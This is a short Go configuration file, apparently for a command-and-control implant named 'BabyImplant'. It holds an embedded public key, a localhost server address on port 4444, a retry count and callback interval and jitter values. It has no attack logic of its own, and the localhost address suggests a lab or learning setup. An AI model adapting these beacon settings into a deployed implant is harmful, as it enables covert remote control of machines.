package config

const (
	ImplantName           string = "BabyImplant"
	MaxRegisterRetryCount int    = 50
	PublicKey             string = "MIIBCgKCAQEApBu0qZ45NuQ5WQ1TAtnKR45Joj3JvaT+umIOysCiUXB+IOs7cUjY1Pqmnt61x78+gBV+jBI5eQIPO9ZaAtxLlBjFAZza8YvMgUr4csqMC1yn/hBi7O80qhROE+7XCwCsn8snfCvjX72wQ7YbcEuPs4vLU+loVPyjyTBvnvgpveciozDK0xpVLt9fdMgmJn5VgvIG+5VleVve2PSrZinOGng8FvjsGV0gvQ6NbUyylyF4Ncov/nNYr9d39UJpSK6pTIA/GysE4V8IMO2tlccbo7ovNqulPCr2BYFxktaUolkw1wZ5TeNvxZ/NodHIxzTArVEt8cJqR98XjwdAYuYYpwIDAQAB"
)

var (
	ServerIp         string = "127.0.0.1"
	ServerPort       int    = 4444
	CallbackInterval int    = 10
	CallbackJitter   int    = 2
)
